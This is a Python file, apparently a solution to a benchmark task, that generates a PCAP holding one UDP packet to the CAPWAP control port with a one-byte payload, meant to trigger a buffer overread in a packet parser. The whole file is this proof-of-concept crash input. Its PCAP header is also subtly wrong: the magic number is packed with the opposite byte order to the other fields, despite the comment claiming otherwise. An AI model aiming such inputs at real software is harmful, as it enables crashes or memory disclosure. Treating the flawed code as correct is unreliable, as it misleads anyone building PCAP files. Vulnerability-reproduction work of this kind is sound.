import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PCAP containing a single Ethernet/IPv4/UDP packet
        # UDP dport set to CAPWAP control port 5246, with a tiny payload to trigger overread
        def ipv4_checksum(header: bytes) -> int:
            s = 0
            # Sum 16-bit words
            for i in range(0, len(header), 2):
                word = (header[i] << 8) + (header[i + 1] if i + 1 < len(header) else 0)
                s += word
                s = (s & 0xffff) + (s >> 16)
            return (~s) & 0xffff

        # Ethernet header
        eth_dst = b'\x00\x00\x00\x00\x00\x00'
        eth_src = b'\x00\x00\x00\x00\x00\x01'
        eth_type = b'\x08\x00'  # IPv4
        eth_header = eth_dst + eth_src + eth_type

        # IPv4 header fields before checksum
        version_ihl = (4 << 4) | 5
        tos = 0
        payload_len = 1  # very small payload to provoke overread
        udp_len = 8 + payload_len
        total_length = 20 + udp_len
        identification = 0
        flags_fragment = 0
        ttl = 64
        protocol = 17  # UDP
        header_checksum = 0
        src_ip = struct.pack('!I', 0x0a000001)  # 10.0.0.1
        dst_ip = struct.pack('!I', 0x0a000002)  # 10.0.0.2

        ip_header_wo_csum = struct.pack('!BBHHHBBH', version_ihl, tos, total_length,
                                        identification, flags_fragment, ttl, protocol,
                                        header_checksum) + src_ip + dst_ip
        header_checksum = ipv4_checksum(ip_header_wo_csum)
        ip_header = struct.pack('!BBHHHBBH', version_ihl, tos, total_length,
                                identification, flags_fragment, ttl, protocol,
                                header_checksum) + src_ip + dst_ip

        # UDP header
        src_port = 12345
        dst_port = 5246  # CAPWAP control port
        udp_checksum = 0  # 0 for no checksum (valid for IPv4)
        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_checksum)

        # Payload
        payload = b'\x00' * payload_len

        # Frame
        frame = eth_header + ip_header + udp_header + payload

        # PCAP global header (little-endian)
        # magic number for little-endian: 0xd4c3b2a1
        pcap_global_header = struct.pack('<IHHIIII',
                                         0xd4c3b2a1,  # magic
                                         2,           # version major
                                         4,           # version minor
                                         0,           # thiszone
                                         0,           # sigfigs
                                         65535,       # snaplen
                                         1)           # network (LINKTYPE_ETHERNET)

        # PCAP packet header
        ts_sec = 0
        ts_usec = 0
        incl_len = len(frame)
        orig_len = len(frame)
        pcap_packet_header = struct.pack('<IIII', ts_sec, ts_usec, incl_len, orig_len)

        return pcap_global_header + pcap_packet_header + frame
